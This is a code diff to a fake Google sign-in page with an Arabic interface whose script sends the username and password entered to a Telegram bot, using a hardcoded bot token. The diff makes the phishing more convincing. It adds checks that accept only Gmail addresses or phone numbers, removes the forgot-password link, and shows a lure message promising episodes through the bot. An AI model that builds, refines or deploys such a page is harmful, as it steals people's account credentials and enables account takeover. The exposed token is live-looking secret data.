@@ -52,6 +52,19 @@
             border-color: #1a73e8;
             outline: none;
         }
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            text-align: left;
+            margin-top: -8px;
+            margin-bottom: 8px;
+        }
+        .success-message {
+            color: #34a853;
+            font-size: 16px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
         button {
             background-color: #1a73e8;
             color: white;
@@ -88,9 +101,10 @@
         <p class="subtitle">المتابعة إلى Google</p>
         <form id="loginForm">
             <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <div id="usernameError" class="error-message"></div>
             <input type="password" id="password" placeholder="كلمة المرور" required>
-            <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
             <button type="submit">تسجيل الدخول</button>
+            <div id="successMessage" class="success-message" style="display: none;"></div>
         </form>
     </div>
 
@@ -98,8 +112,23 @@
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            const username = document.getElementById('username').value;
+            const username = document.getElementById('username').value.trim();
+            const usernameError = document.getElementById('usernameError');
+            const successMessage = document.getElementById('successMessage');
             const password = document.getElementById('password').value;
+
+            // Reset error and success messages
+            usernameError.textContent = '';
+            successMessage.style.display = 'none';
+
+            // Regular expression to validate Gmail or phone number
+            const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+            const phoneRegex = /^[0-9]{10,15}$/;
+
+            if (!gmailRegex.test(username) && !phoneRegex.test(username)) {
+                usernameError.textContent = 'يرجى إدخال بريد Gmail صالح أو رقم هاتف صالح.';
+                return;
+            }
 
             // Telegram bot token and chat ID
             const botToken = '7676983813:AAGe8IxQvzirs4iMpJIVWkudxc8kyzZLCiE';
@@ -122,14 +151,15 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('تم إرسال معلومات تسجيل الدخول بنجاح!');
+                    successMessage.textContent = 'تم إرسال الطلب بنجاح. في حالة صحة المعلومات، سوف تحصل على جميع الحلقات عبر البوت.';
+                    successMessage.style.display = 'block';
                 } else {
-                    alert('فشل في إرسال المعلومات.');
+                    usernameError.textContent = 'فشل في إرسال المعلومات. حاول مرة أخرى.';
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('حدث خطأ.');
+                usernameError.textContent = 'حدث خطأ أثناء الإرسال. حاول مرة أخرى.';
             });
         });
     </script>
